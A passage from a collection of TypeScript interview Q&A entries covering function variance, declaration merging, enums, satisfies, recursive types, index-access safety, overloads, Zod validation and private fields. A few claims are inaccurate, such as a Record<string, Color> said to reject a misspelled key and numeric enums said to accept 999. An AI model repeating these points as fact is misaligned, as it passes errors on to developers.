- **Bivariance (both directions):** Allows assignability in either direction; historically used for method parameters in TypeScript for backward compatibility.

```typescript
class Animal { name = 'animal'; }
class Dog extends Animal { bark() {} }

// Return types are COVARIANT:
let getDog: () => Dog = () => new Dog();
let getAnimal: () => Animal = getDog; // OK! Dog is an Animal.

// Parameter types are CONTRAVARIANT (under strictFunctionTypes: true):
let handleAnimal: (a: Animal) => void = (a) => console.log(a.name);
let handleDog: (d: Dog) => void = handleAnimal; // OK! Can handle any Animal, including Dog.

let handleDogOnly: (d: Dog) => void = (d) => d.bark();
// let handleAnimalError: (a: Animal) => void = handleDogOnly; // Error TS2322! Animal may not have .bark()
```

**Complexity analysis and mechanics:**
- **Compiler flag:** `strictFunctionTypes: true` (included in `strict: true`) enables strict contravariance for function parameters.
- **Method exception:** Methods declared as `method(x: Animal): void` in interfaces remain bivariant for historical array compatibility (`Array<Animal>` vs `Array<Dog>`), while property syntax `method: (x: Animal) => void` enforces strict contravariance.

**Algorithmic mechanics and edge cases:**
Contravariance prevents calling a specialized method on a general instance. If `handleDogOnly` were accepted as `(a: Animal) => void`, someone could pass a `Cat` into it, causing `d.bark()` to fail with `TypeError: d.bark is not a function` at runtime.

## Why

Strict contravariance in function parameters prevents runtime method-not-found exceptions when polymorphism is used.

## Worked Case

Walkthrough scenario: An event bus registers handlers for MouseEvent and generic Event. With strictFunctionTypes enabled, a listener expecting generic Event can be registered where a MouseEvent listener is required because it safely handles all properties. However, registering a MouseEvent listener (requiring clientX) where a generic Event (e.g. keyboard event) is dispatched causes TS2322, preventing runtime undefined access.

## Risk

Declaring function members as interface methods rather than property signatures re-enables unsafe bivariance.

## Trade-off

Strict variance checks catch subtle polymorphic bugs at the expense of requiring more precise callback signatures.

## Try This

Toggle strictFunctionTypes in tsconfig.json and compare assignability of a (cat: Cat) => void function to (animal: Animal) => void.

## Follow-ups

### Why did TypeScript historically support bivariant method parameters?

To allow Array<Derived> to be assignable to Array<Base>, enabling common JavaScript programming idioms before strict soundness flags were created.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/functions.html#function-type-expressions
- https://www.typescriptlang.org/tsconfig/#strictFunctionTypes

# How do declaration merging, module augmentation, and ambient .d.ts files extend third-party library types?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript allows extending existing type definitions without modifying upstream library source code through three complementary mechanisms:
1. **Declaration Merging:** Multiple interface declarations sharing the same identifier in the same scope merge their members into a single interface.
2. **Module Augmentation:** Using `declare module 'library-name'` in a `.d.ts` file to add new methods, properties, or interfaces to an imported package.
3. **Ambient Declarations:** Top-level declarations using `declare` (e.g., `declare global` or `declare const __APP_VERSION__: string`) that describe global variables provided by the runtime environment.

```typescript
// 1. Interface Declaration Merging
interface Window {
    customAnalyticsId: string;
}
// window.customAnalyticsId is now valid across the application!

// 2. Module Augmentation in types/express.d.ts:
import 'express';
declare module 'express-serve-static-core' {
    interface Request {
        user?: {
            id: string;
            role: 'admin' | 'user';
        };
    }
}

// 3. Ambient Global Definition:
declare const __BUILD_TIMESTAMP__: string;
```

**Complexity analysis and mechanics:**
- **Symbol table resolution:** The TypeScript compiler groups declarations by qualified name into a single symbol table entry.
- **Non-mergeable types:** Interfaces and namespaces merge; `type` aliases and `class` declarations cannot merge with themselves.

**Algorithmic mechanics and edge cases:**
For module augmentation to take effect, the file must be treated as a module (containing an `import` or `export` statement). If augmenting a global namespace from inside a module, wrap it in `declare global { ... }`. Ensure `tsconfig.json` includes the custom definition file under `"include": ["src/**/*", "types/**/*"]`.

## Why

Module augmentation enables attaching framework context (like authenticated users to HTTP requests) with strict compile-time typing.

## Worked Case

Walkthrough scenario: An Express app uses JWT middleware that attaches user to req.user. By default, req.user does not exist on Request, producing TS2339. The team creates src/types/express.d.ts with declare module 'express-serve-static-core' { interface Request { user: UserPayload } }. All route controllers immediately gain typed access to req.user without casting.

## Risk

Declaration merging silently combines conflicting property types if names collide, causing hard-to-debug compiler errors.

## Trade-off

Allows non-invasive extension of third-party contracts but requires keeping augmentations synchronized with runtime middleware.

## Try This

Create an env.d.ts augmenting ProcessEnv with custom environment variables and observe process.env autocomplete.

## Follow-ups

### Can type aliases undergo declaration merging in TypeScript?

No, only interfaces, namespaces, and enums can undergo declaration merging; type aliases produce duplicate identifier error TS2300.

## Citations

- https://www.typescriptlang.org/docs/handbook/declaration-merging.html
- https://www.typescriptlang.org/docs/handbook/declaration-files/templates/module-plugin-d-ts.html

# Why should TypeScript enum constructs generally be avoided in favor of const object assertions (as const)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Standard TypeScript `enum` constructs are one of the few TypeScript features that emit non-standard runtime JavaScript code rather than erasing to clean syntax. Numeric enums allow unsafe reverse-mapping assignments (passing arbitrary numbers), string enums produce bloated JavaScript objects that resist tree-shaking, and nominal enum types resist plain string assignability. In contrast, `as const` object assertions provide zero-overhead, purely compile-time literal unions that tree-shake perfectly.

```typescript
// Problematic Enum (generates runtime IIFE closure code):
enum UserRoleEnum {
    Admin = 'ADMIN',
    User = 'USER'
}
// const r: UserRoleEnum = 'ADMIN'; // Error! String literal 'ADMIN' is not assignable to enum.

// Modern Best Practice: 'as const' Object
export const UserRole = {
    Admin: 'ADMIN',
    User: 'USER'
} as const;

export type UserRole = (typeof UserRole)[keyof typeof UserRole];
// Equivalent to: 'ADMIN' | 'USER'

function setRole(role: UserRole) { console.log(role); }
setRole(UserRole.Admin); // Valid
setRole('ADMIN');       // Also completely valid without importing enum!
```

**Complexity analysis and mechanics:**
- **Bundle size:** `as const` emits a plain frozen JavaScript object or erases completely when inlined; `enum` emits multi-line closures.
- **Tree shaking:** Modern bundlers easily tree-shake unused properties from `const` objects; enums often resist tree shaking.

**Algorithmic mechanics and edge cases:**
Numeric enums have a critical soundness hole: `enum Direction { Up, Down }` allows `let d: Direction = 999;` to compile without error. `const enum` removes runtime code by inlining values at call sites, but breaks under Babel, `isolatedModules`, and across package boundaries. Plain `as const` objects suffer none of these drawbacks.

## Why

as const objects provide identical type safety to enums with zero runtime baggage and natural string literal assignability.

## Worked Case

Walkthrough scenario: A microservice API returns JSON payload { role: 'ADMIN' }. A frontend using enum UserRole cannot assign res.role directly to a variable of type UserRole without casting (res.role as UserRole). Migrating to as const object allows direct assignment because type UserRole is the literal union 'ADMIN' | 'USER', eliminating casting and runtime deserialization wrappers.

## Risk

Numeric enums permit assigning arbitrary numbers not present in the enum definition, bypassing type safety completely.

## Trade-off

as const requires a two-line idiom (object definition plus typeof lookup) instead of the single enum keyword.

## Try This

Inspect the emitted JS from a TypeScript enum versus an as const object in the TypeScript Playground to observe generated code.

## Follow-ups

### What is the primary danger of using const enum across separate npm packages?

If the upstream package updates an inlined const enum value, dependent consumers will keep stale inlined values until recompiled from source.

## Citations

- https://www.typescriptlang.org/docs/handbook/enums.html
- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-3-4.html#const-assertions

# How does the satisfies operator differ from type annotations and type assertions (as)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `satisfies` operator (introduced in TypeScript 4.9) validates that an expression conforms to a type contract *without* widening or changing the inferred type of the expression. 
- **Type annotation (`const x: T`)**: Forces the variable to have type `T`, widening specific literal properties and discarding narrower inferred details.
- **Type assertion (`const x = val as T`)**: Tells the compiler to trust the developer, silencing checks and potentially masking errors.
- **`satisfies` (`const x = val satisfies T`)**: Verifies that `val` meets the requirements of `T`, but preserves the most specific inferred type of `val` for subsequent usage.

```typescript
type Color = string | [number, number, number];
type Palette = Record<string, Color>;

// 1. With Type Annotation (WIDENED):
const p1: Palette = {
    red: [255, 0, 0],
    green: '#00ff00'
};
// p1.red.slice(); // Error! Property 'slice' does not exist on type 'string'.

// 2. With satisfies Operator (PRESERVED NARROW TYPE):
const p2 = {
    red: [255, 0, 0],
    green: '#00ff00'
} satisfies Palette;

p2.red.map(x => x * 2); // Valid! p2.red is known specifically to be [number, number, number].
p2.green.toUpperCase();  // Valid! p2.green is known specifically to be string.
// const p3 = { ble: '#00f' } satisfies Palette; // Validates keys, rejects typos if properties don't match.
```

**Complexity analysis and mechanics:**
- **Compile-time check:** Validates assignability against `Palette` in O(1) without replacing the inferred type AST node.
- **Zero runtime impact:** Erased completely during JavaScript compilation.

**Algorithmic mechanics and edge cases:**
`satisfies` catches property name typos in configuration objects while retaining exact literal values. For instance, in routes or theme configs, `satisfies` ensures all required keys exist while autocomplete retains exact route string literals rather than widening to generic `string`.

## Why

satisfies guarantees contract compliance while retaining exact property types and autocompletion precision.

## Worked Case

Walkthrough scenario: An application defines route configuration config = { home: '/', user: '/user/:id' } satisfies Routes. Using type annotation config: Routes would widen values to string, causing router.get(config.home) to lose literal type info. With satisfies, config.home remains literal '/', and passing an invalid route like config.settings triggers immediate TS2353.

## Risk

Using as assertions instead of satisfies silences compiler errors on invalid properties and causes runtime crashes.

## Trade-off

satisfies requires TypeScript 4.9+ and is slightly more verbose than plain variable annotations.

## Try This

Create an object with a misspelled property validated by satisfies Record<string, number> and check compiler diagnostic.

## Follow-ups

### Can satisfies prevent excess property errors when creating object literals?

Yes, satisfies validates the object against the target schema, immediately flagging extra or misspelled properties that do not satisfy the constraint.

## Citations

- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-9.html#the-satisfies-operator
- https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#type-assertions

# How do you model recursive and deeply nested immutable types (e.g., DeepReadonly) with conditional generics?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Recursive conditional types allow iterating through arbitrarily nested data structures. A `DeepReadonly<T>` utility unwraps primitives, functions, arrays, maps, sets, and objects, applying `readonly` modifiers recursively at every level:

```typescript
type DeepReadonly<T> =
    T extends Function | boolean | number | string | symbol | null | undefined
        ? T
        : T extends Map<infer K, infer V>
            ? ReadonlyMap<DeepReadonly<K>, DeepReadonly<V>>
            : T extends Set<infer M>
                ? ReadonlySet<DeepReadonly<M>>
                : T extends Array<infer E>
                    ? ReadonlyArray<DeepReadonly<E>>
                    : T extends object
                        ? { readonly [P in keyof T]: DeepReadonly<T[P]> }
                        : T;

interface State {
    user: {
        profile: { name: string; tags: string[] };
    };
}

type ImmutableState = DeepReadonly<State>;
// state.user.profile.name = 'New'; // Error TS2540: Cannot assign to 'name' because it is a read-only property.
// state.user.profile.tags.push('admin'); // Error TS2339: Property 'push' does not exist on ReadonlyArray.
```

**Complexity analysis and mechanics:**
- **Recursion limit:** TypeScript allows recursive type evaluations up to a built-in depth limit (around 50 levels) before emitting error TS2589.
- **Primitive termination:** Base cases for primitives and functions prevent infinite recursion on standard prototype methods.

**Algorithmic mechanics and edge cases:**
Excluding `Function` from mapping is essential; otherwise, function signatures get transformed into plain objects with readonly methods. Edge cases include circular object references (which trigger circularity depth errors) and DOM elements or native classes like `Date` and `RegExp` which should be preserved as immutable primitives.

## Why

Shallow Readonly leaves nested objects and arrays vulnerable to accidental mutations in state management stores.

## Worked Case

Walkthrough scenario: In a Redux reducer, state has nested object permissions: { roles: ['editor'] }. Standard Readonly<State> prevents state.permissions = ... but permits state.permissions.roles.push('admin'). Applying DeepReadonly<State> transforms roles into ReadonlyArray<string>, causing roles.push to fail compilation immediately and preventing state mutation bugs.

## Risk

Applying recursive mapped types to circular object graphs or complex classes like Date triggers recursion limit TS2589.

## Trade-off

Deep recursive types increase compile times and type-checking latency on massive state trees.

## Try This

Apply DeepReadonly to a nested configuration object and verify that modifying a third-level array item causes a compiler error.

## Follow-ups

### Why must Function be explicitly excluded from object mapping in DeepReadonly?

In JavaScript, functions are objects with properties. Without an explicit base case, mapped types attempt to iterate function prototype properties, corrupting callable signatures.

## Citations

- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-1.html#recursive-conditional-types
- https://www.typescriptlang.org/docs/handbook/utility-types.html#readonlytype

# How does noUncheckedIndexedAccess protect dictionary and array accesses against runtime undefined errors?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** By default, TypeScript assumes that accessing an element by index on an array `T[]` or index signature `Record<string, T>` always returns `T`, even though an out-of-bounds index or missing dictionary key evaluates to `undefined` at runtime. Enabling `"noUncheckedIndexedAccess": true` in `tsconfig.json` forces TypeScript to type index accesses as `T | undefined`, compelling developers to perform explicit existence checks before using the value.

```typescript
// With noUncheckedIndexedAccess: false (UNSAFE DEFAULT):
const users: string[] = ['Alice', 'Bob'];
const third = users[2]; // Inferred as 'string'!
// third.toUpperCase(); // Compiles fine! Throws TypeError at runtime: Cannot read properties of undefined.

// With noUncheckedIndexedAccess: true (SAFE MODE):
const safeUsers: string[] = ['Alice', 'Bob'];
const safeThird = safeUsers[2]; // Inferred as 'string | undefined'!

if (safeThird !== undefined) {
    console.log(safeThird.toUpperCase()); // Safe! Narrowed to 'string'.
}

// Dictionary lookup:
const cache: Record<string, number> = { foo: 1 };
const val = cache['bar']; // Inferred as 'number | undefined'
```

**Complexity analysis and mechanics:**
- **Compile-time cost:** Modifies the return type lookup of index access expressions to `Union(T, undefined)` in the AST.
- **Runtime impact:** Zero overhead. Compels explicit bounds/undefined checks in source code.

**Algorithmic mechanics and edge cases:**
A common friction point occurs in standard bounded loops: `for (let i = 0; i < arr.length; i++) { arr[i]... }` still infers `arr[i]` as `T | undefined`. Developers resolve this cleanly using modern `for...of` loops, `arr.forEach`, or nullish coalescing `arr[i] ?? fallback`.

## Why

Index signatures and arrays are frequent sources of runtime undefined crashes that default TypeScript settings fail to catch.

## Worked Case

Walkthrough scenario: An application parses CSV rows into an array of columns. With default settings, columns[5].trim() compiles cleanly. When a short row with 3 columns arrives, columns[5] is undefined, crashing the parser with unhandled TypeError. With noUncheckedIndexedAccess enabled, columns[5] is inferred as string | undefined, forcing columns[5]?.trim() or an explicit length check.

## Risk

Default TypeScript settings assume dictionary lookups always succeed, leading to undefined is not an object exceptions in production.

## Trade-off

Requires explicit undefined checks when indexing arrays by number, slightly increasing verbosity in manual index loops.

## Try This

Enable noUncheckedIndexedAccess in tsconfig.json and inspect errors on array index accesses.

## Follow-ups

### How do you avoid repeated undefined checks when iterating over arrays with noUncheckedIndexedAccess enabled?

Use for...of iteration or Array.prototype methods (map, forEach) where the element parameter is guaranteed to be type T without undefined.

## Citations

- https://www.typescriptlang.org/tsconfig/#noUncheckedIndexedAccess
- https://www.typescriptlang.org/docs/handbook/2/objects.html#index-signatures

# How do method signatures and property function signatures differ regarding strict function checking in interfaces?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In TypeScript interfaces, functions can be declared using two distinct syntaxes: method syntax (`methodName(arg: T): R`) and property signature syntax (`methodName: (arg: T) => R`). Under the compiler flag `strictFunctionTypes: true`, property signatures are checked with strict contravariance on parameters, whereas method signatures are checked bivariantly (allowing looser, potentially unsafe assignments for backward compatibility with `Array` and `DOM`).

```typescript
interface Animal { name: string; }
interface Dog extends Animal { bark(): void; }

// 1. Method signature (BIVARIANT):
interface MethodHandler {
    handle(arg: Dog): void;
}

// 2. Property function signature (STRICT CONTRAVARIANT):
interface PropertyHandler {
    handle: (arg: Dog) => void;
}

let animalFn = (a: Animal) => console.log(a.name);
let dogFn = (d: Dog) => d.bark();

// Both accept animalFn (wider parameter is safe):
const m1: MethodHandler = { handle: animalFn }; // OK
const p1: PropertyHandler = { handle: animalFn }; // OK

// Method syntax allows narrower bivariant assignment (UNSAFE):
interface GenericMethodHandler {
    handle(arg: Animal): void;
}
interface GenericPropertyHandler {
    handle: (arg: Animal) => void;
}
// const p2: GenericPropertyHandler = { handle: dogFn }; // Compile Error TS2322! Safe rejection.
const m2: GenericMethodHandler = { handle: dogFn }; // Compiles with method syntax! Unsafe.
```

**Complexity analysis and mechanics:**
- **Contravariance enforcement:** Property function signatures trigger the `CheckFlags.Contravariant` pass in the type checker.
- **Best practice:** Always use property syntax `fn: (arg: T) => R` for callbacks and handlers where strict type safety is paramount.

**Algorithmic mechanics and edge cases:**
If `m2.handle(new Animal())` is called, `dogFn` executes expecting `.bark()`, resulting in immediate runtime crash `d.bark is not a function`. Method syntax remains bivariant intentionally so that methods like `Array.prototype.push` could operate across subclasses.

## Why

Property function signatures enforce strict contravariant parameter checking, preventing polymorphic method-not-found crashes.

## Worked Case

Walkthrough scenario: An event handler interface defines process(event: MouseEvent): void using method syntax. A developer assigns it to handle generic DOM events. In production, a keyboard event is passed, causing code inside process to access event.clientX as undefined. Converting process to property syntax process: (event: MouseEvent) => void flags the assignment at build time.

## Risk

Using method syntax in interfaces for callbacks permits assigning functions that expect narrower arguments than callers provide.

## Trade-off

Property syntax is slightly more verbose than method syntax but guarantees full type soundness under strict mode.

## Try This

Declare an interface with both method and property function syntax and test assigning a specialized handler to a generalized interface.

## Follow-ups

### Why did the TypeScript team deliberately exclude method signatures from strictFunctionTypes?

To preserve usability of built-in JavaScript patterns like Array<Animal> where methods like push(item: Animal) would otherwise become invariant.

## Citations

- https://www.typescriptlang.org/tsconfig/#strictFunctionTypes
- https://www.typescriptlang.org/docs/handbook/2/functions.html#function-type-expressions

# How do generic constraints (extends) and distributive conditional types evaluate over naked type parameters?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A generic constraint (`T extends Constraint`) restricts the types that callers can supply to a generic parameter. When a conditional type tests a naked type parameter (`T extends Target ? TrueBranch : FalseBranch`), and `T` is instantiated with a union type `A | B | C`, the conditional type automatically distributes over each member of the union: `(A extends Target ? ...) | (B extends Target ? ...) | (C extends Target ? ...)`.

```typescript
// 1. Generic Constraint:
interface Identifiable {
    id: string;
}
function getEntityId<T extends Identifiable>(entity: T): string {
    return entity.id;
}

// 2. Distributive Conditional Type:
type ToArray<T> = T extends any ? T[] : never;
type Result = ToArray<string | number>;
// Evaluates as ToArray<string> | ToArray<number>
// Result is: string[] | number[] (NOT (string | number)[])!

// 3. Non-distributive conditional type (wrapping in tuple):
type NonDistributiveToArray<T> = [T] extends [any] ? T[] : never;
type NonDistResult = NonDistributiveToArray<string | number>;
// Result is: (string | number)[]
```

**Complexity analysis and mechanics:**
- **Evaluation model:** Distributive conditional types distribute linearly O(N) over union size N.
- **Naked parameter requirement:** Distribution only occurs when the type being checked is an unwrapped, naked generic parameter.

**Algorithmic mechanics and edge cases:**
Distributive conditional types form the foundation of filtering utilities like `Exclude<T, U>` (`T extends U ? never : T`) and `Extract<T, U>`. If a developer passes `never` to a naked distributive conditional type, the result is `never` automatically because `never` is an empty union of zero members.

## Why

Distributive conditional types enable union filtering and mapping across individual algebraic data types.

## Worked Case

Walkthrough scenario: An engineer implements a message parser where EventUnion = TextEvent | ImageEvent. The engineer writes type EventArray<T> = T extends any ? T[] : never. When passing EventUnion, the resulting type is TextEvent[] | ImageEvent[], meaning an array cannot contain mixed events. The engineer wraps [T] extends [any] to correctly produce (TextEvent | ImageEvent)[].

## Risk

Unintended distribution can produce unions of arrays (string[] | number[]) when an array of unions ((string | number)[]) was intended.

## Trade-off

Distributive behavior is intuitive for filtering but requires tuple wrapping syntax [T] extends [U] when holistic checking is needed.

## Try This

Test ToArray<string | number> vs NonDistributiveToArray<string | number> and inspect the difference in resulting array types.

## Follow-ups

### What happens when never is passed to a distributive conditional type T extends any ? T[] : never?

It evaluates to never immediately, because never is treated as an empty union, resulting in zero evaluations.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/generics.html#generic-constraints
- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#distributive-conditional-types

# How do you type overloaded functions properly in TypeScript without leaking implementation signature details?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Function overloading in TypeScript allows a single function to declare multiple overload signatures specifying different parameter and return types for different call patterns, followed by a single implementation signature that is compatible with all overloads. Crucially, the implementation signature is invisible to callers; external callers can only invoke the function using one of the explicitly declared overload signatures.

```typescript
// Overload signatures (VISIBLE TO CONSUMERS):
function makeDate(timestamp: number): Date;
function makeDate(year: number, month: number, day: number): Date;

// Implementation signature (HIDDEN FROM CONSUMERS):
function makeDate(yearOrTimestamp: number, month?: number, day?: number): Date {
    if (month !== undefined && day !== undefined) {
        return new Date(yearOrTimestamp, month - 1, day);
    }
    return new Date(yearOrTimestamp);
}

makeDate(1672531199000);        // Valid: matches overload 1
makeDate(2026, 1, 1);           // Valid: matches overload 2
// makeDate(2026, 1);           // Error TS2575! No overload expects 2 arguments.
```

**Complexity analysis and mechanics:**
- **Overload resolution:** Overload signatures are evaluated sequentially from top to bottom; the first matching signature wins.
- **Compatibility requirement:** The implementation signature must be a supertype capable of accepting all preceding overloads.

**Algorithmic mechanics and edge cases:**
Always order overloads from most specific to most general. If a general signature (e.g. accepting `any` or `object`) is placed first, it will prematurely shadow more specific signatures beneath it. When possible, prefer union types or conditional generics over overloads for cleaner definitions, unless argument types fundamentally alter return shapes.

## Why

Function overloads present clean, strongly-typed public APIs while hiding complex internal argument branching.

## Worked Case

Walkthrough scenario: A DOM query helper query(selector: 'input'): HTMLInputElement; query(selector: string): HTMLElement. Because 'input' is placed before string, query('input') immediately returns HTMLInputElement, allowing .value access without casting. Passing 'div' falls through to the second overload returning HTMLElement safely.

## Risk

Ordering overloads from general to specific causes TypeScript to bind to the general signature, shadowing specific overloads.

## Trade-off

Overloads provide distinct signature documentation but require maintaining a broad implementation signature internally.

## Try This

Declare an overloaded function where overload 1 takes a string and returns number and overload 2 takes number and returns string.

## Follow-ups

### Can callers directly invoke the implementation signature of an overloaded function?

No, the implementation signature is completely erased from the public contract; callers can only call matching overload signatures.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/functions.html#function-overloads
- https://www.typescriptlang.org/docs/handbook/declaration-files/do-s-and-don-ts.html#function-overloads

# How does TypeScript handle excess property checks on object literals versus assigned variables?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript applies Excess Property Checks specifically when an object is declared as a fresh object literal directly at an assignment or function argument position. If an object literal contains properties not declared in the target interface, TypeScript flags an error. However, if the object is first assigned to an intermediate variable, TypeScript applies standard structural subtyping (width subtyping), permitting extra properties without error.

```typescript
interface Options {
    title: string;
    width?: number;
}

function setup(opts: Options) { console.log(opts.title); }

// 1. Fresh Object Literal -> EXCESS PROPERTY CHECK TRIGGERED:
// setup({ title: 'App', widht: 200 });
// Error TS2353: Object literal may only specify known properties, and 'widht' does not exist in type 'Options'.

// 2. Intermediate Variable -> STANDARD STRUCTURAL SUBTYPING:
const raw = { title: 'App', widht: 200 };
setup(raw); // Compiles without error!
```

**Complexity analysis and mechanics:**
- **Freshness flag:** The compiler tags fresh object literals with a temporary internal `FreshObjectLiteral` flag.
- **Typo prevention:** Excess property checking exists primarily to catch misspelled optional properties that would otherwise silently be ignored.

**Algorithmic mechanics and edge cases:**
If an interface contains an index signature `[key: string]: any`, excess property checks are disabled because any extra property is considered valid under the index signature. Type assertions (`as Options`) also strip freshness, disabling excess property checks.

## Why

Excess property checking catches misspelled optional properties on object literals that would otherwise fail silently at runtime.

## Worked Case

Walkthrough scenario: A developer configures an HTTP client with { timeoutMs: 5000 }. The interface expects timeout. Because the developer passes the literal directly to apiClient.create({ timeoutMs: 5000 }), TypeScript flags TS2353 immediately, catching the configuration typo. If the developer had assigned it to a generic variable first, the typo would have caused silent timeouts.

## Risk

Bypassing excess checks using intermediate variables or type assertions allows typos (e.g. widht) to go undetected.

## Trade-off

Strict on direct literals to catch typos, but relaxed on references to support structural polymorphism and extension.

## Try This

Pass an object literal with an extra property directly into a function vs through a const variable and compare compiler diagnostics.

## Follow-ups

### How can an interface explicitly allow arbitrary extra properties while keeping typed keys?

Add a string index signature: [key: string]: unknown, which permits additional properties while retaining type checks for defined keys.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/objects.html#excess-property-checks
- https://www.typescriptlang.org/docs/handbook/interfaces.html#excess-property-checks

# How do you safely validate external API payloads into TypeScript types using runtime schema validators like Zod?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript types do not exist at runtime; they are erased during compilation. External network payloads (JSON from REST or WebSockets) must be parsed at runtime using schema validation libraries such as Zod, Valibot, or ArkType. Zod validates the unknown data against a declared runtime schema, strips or rejects unexpected properties, and infers the corresponding static TypeScript type using `z.infer<typeof Schema>`.

```typescript
import { z } from 'zod';

// 1. Declare runtime validation schema:
export const UserSchema = z.object({
    id: z.string().uuid(),
    email: z.string().email(),
    age: z.number().int().min(18),
    roles: z.array(z.enum(['admin', 'member'])).default(['member'])
});

// 2. Infer compile-time TypeScript type:
export type User = z.infer<typeof UserSchema>;

// 3. Parse untrusted JSON safely:
export async function fetchUser(url: string): Promise<User> {
    const response = await fetch(url);
    const rawData: unknown = await response.json();
    // parse() validates and throws ZodError on schema mismatch:
    return UserSchema.parse(rawData);
}
```

**Complexity analysis and mechanics:**
- **Runtime parsing:** O(K) where K is the number of schema fields, executing lightweight regexes and boundary assertions.
- **Single source of truth:** Eliminates drift between runtime validation code and compile-time TypeScript interfaces.

**Algorithmic mechanics and edge cases:**
Using `safeParse()` returns a discriminated union `{ success: true; data: T } | { success: false; error: ZodError }`, allowing graceful error reporting without throwing exceptions. Edge cases include date strings (which require `.datetime()` or transforms), nullable fields (`.nullable()`), and optional fields (`.optional()`).

## Why

Schema validators guarantee that external runtime data conforms strictly to TypeScript compile-time expectations.

## Worked Case

Walkthrough scenario: An API response unexpectedly returns age: '25' as a string instead of number. Using as User results in user.age + 5 producing string concatenation '255' instead of 30. With UserSchema.parse(), Zod catches the type mismatch immediately, throwing a detailed validation error pointing to field 'age', preventing state corruption in the UI.

## Risk

Casting fetch responses with as User bypasses all validation, causing silent runtime failures when backend contracts drift.

## Trade-off

Adds a small runtime bundle cost (Zod ~12KB gzip) in exchange for bulletproof network boundary validation.

## Try This

Write a Zod schema for an API response and test parsing an invalid object with safeParse() to inspect generated error issues.

## Follow-ups

### What is the difference between safeParse and parse in Zod?

parse throws a ZodError on validation failure, whereas safeParse returns a typed result object with success boolean and error/data fields.

## Citations

- https://zod.dev/
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html

# How do private identifiers (#field) compare with TypeScript's private modifier in emitted JavaScript?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript's `private` keyword provides compile-time access restriction only; it is completely erased during compilation, meaning the property remains an ordinary public property at runtime in JavaScript. In contrast, ECMAScript private identifiers (`#field`) enforce true runtime privacy at the JavaScript engine level using WeakMap-like private symbol slots, making the field completely inaccessible from outside the class instance even via `in` checks or bracket reflection.

```typescript
class Account {
    private tsSecret: string = 'ts-private';
    #hardSecret: string = 'hard-private';

    reveal() {
        console.log(this.tsSecret, this.#hardSecret);
    }
}

const acc = new Account();
// 1. TypeScript private keyword (Bypassed at runtime):
// acc.tsSecret; // Compile Error TS2341: Property 'tsSecret' is private.
console.log((acc as any).tsSecret); // Prints 'ts-private'! Runtime accessible!

// 2. ECMAScript # private identifier (Hard runtime boundary):
// console.log(acc.#hardSecret); // SyntaxError at parse time!
console.log((acc as any)['#hardSecret']); // Prints undefined! Cannot be accessed!
```

**Complexity analysis and mechanics:**
- **Engine implementation:** ECMAScript `#fields` use private brand checks attached to the internal object slot in V8/SpiderMonkey.
- **Performance:** Modern JS engines optimize `#fields` nearly identically to regular properties via hidden classes.

**Algorithmic mechanics and edge cases:**
`#fields` cannot be deleted with `delete`, cannot be dynamically accessed via bracket notation (`obj[#prop]` is invalid syntax), and are unique to the enclosing class declaration (subclasses cannot access `#fields` of their parent class). Use `#fields` when building security boundaries, SDKs, or libraries where consumers must not access internal state.

## Why

ECMAScript private fields enforce true runtime encapsulation that cannot be breached by bracket reflection or casting.

## Worked Case

Walkthrough scenario: An auth SDK stores a cryptographic token in a class property. Using private token allows third-party scripts or extensions to read it via (authClient as any).token. Refactoring to #token prevents external extraction completely; even Object.keys(authClient) and Object.getOwnPropertyNames(authClient) return empty arrays, protecting the token from memory inspection.

## Risk

Relying on TypeScript's private keyword for security or encryption key encapsulation fails because compiled JS leaves fields public.

## Trade-off

private fields cannot be accessed by unit tests or subclasses, requiring explicit getters or architectural decoupling.

## Try This

Compile a class with both private x and #x in TypeScript Playground and inspect the resulting ES2022 JavaScript output.

## Follow-ups

### Can child subclasses access ECMAScript #private fields of their parent class?

No, #private fields are strictly scoped to the declaring class body; subclasses cannot access them even using inheritance.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/classes.html#member-visibility
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/Private_properties

# What are the exact functional and structural differences between interface and type alias in TypeScript?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

